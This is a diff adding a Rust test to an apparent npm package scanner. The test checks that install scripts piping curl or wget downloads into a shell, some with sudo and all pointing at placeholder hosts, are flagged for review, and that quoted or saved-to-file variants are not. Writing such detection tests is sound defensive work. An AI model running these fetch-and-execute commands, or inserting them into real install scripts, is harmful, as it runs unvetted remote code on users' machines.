@@ -546,6 +546,52 @@ fn literal_download_pipeline_is_distinguished_from_a_quoted_example() {
         .all(|signal| signal.level == NpmSignalLevel::Observation));
 }
 
+/// npm_signals used its own word splitter, which gave up on `$`, `>`, `\\`,
+/// `(` and backticks, so ordinary download-to-shell scripts produced no signal.
+/// The core tokenizer and interpreter resolution handle them.
+#[test]
+fn download_pipeline_with_variables_wrappers_or_redirections_is_a_review_signal() {
+    let signals_for = |script: &str| {
+        let metadata = serde_json::json!({
+            "name": "fixture",
+            "version": "1",
+            "scripts": { "install": script },
+        })
+        .to_string();
+        inspect(&package(metadata.as_bytes(), &[])).signals
+    };
+    for script in [
+        "curl $U | bash",
+        "curl -fsSL \"$URL\" | sh",
+        "curl -fsSL x | sh >/dev/null",
+        "curl -fsSL https://example.invalid/setup | sh 2>&1",
+        "wget -qO- https://example.invalid/setup | sudo bash",
+        "cd build && curl -fsSL https://example.invalid/s | bash -s -- --yes",
+        "curl -fsSL \"https://example.invalid/$(uname)\" | sh",
+    ] {
+        assert!(
+            signals_for(script)
+                .iter()
+                .any(|signal| signal.kind == NpmSignalKind::DownloadToShell
+                    && signal.level == NpmSignalLevel::Review),
+            "{script}"
+        );
+    }
+    for script in [
+        "echo curl $U | sh",
+        "curl $U > setup.sh",
+        "curl $U | tee setup.sh",
+        "echo 'curl $U | sh'",
+    ] {
+        assert!(
+            signals_for(script)
+                .iter()
+                .all(|signal| signal.kind != NpmSignalKind::DownloadToShell),
+            "{script}"
+        );
+    }
+}
+
 #[test]
 fn credential_network_combination_has_evidence_and_lifecycle_link() {
     let metadata =
